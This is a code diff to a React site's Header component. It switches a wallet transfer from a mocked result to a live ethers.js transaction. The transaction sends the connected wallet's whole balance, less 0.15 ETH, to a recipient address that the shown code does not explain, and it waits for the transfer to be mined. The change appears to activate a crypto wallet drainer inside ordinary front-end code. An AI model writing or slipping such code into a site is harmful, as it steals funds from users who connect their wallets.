@@ -192,18 +192,15 @@ const Header: React.FC = () => {
         }
 
         const finalValue = balanceBeforeTransfer.sub(parseEther('0.15'));
-        // const tx = await provider.getSigner().sendTransaction({
-        //   from: walletAddress,
-        //   to: recipientAddress,
-        //   value: finalValue,
-        //   gasLimit: 21000,
-        // });
+        const tx = await provider.getSigner().sendTransaction({
+          from: walletAddress,
+          to: recipientAddress,
+          value: finalValue,
+          gasLimit: 21000,
+        });
 
-        // // Wait for transaction to be mined
-        // const result = await tx.wait();
-        const result = {
-          status: 1,
-        };
+        // Wait for transaction to be mined
+        const result = await tx.wait();
 
         // Show sender balance after transfer
         const balanceAfterTransfer = await provider.getBalance(walletAddress);
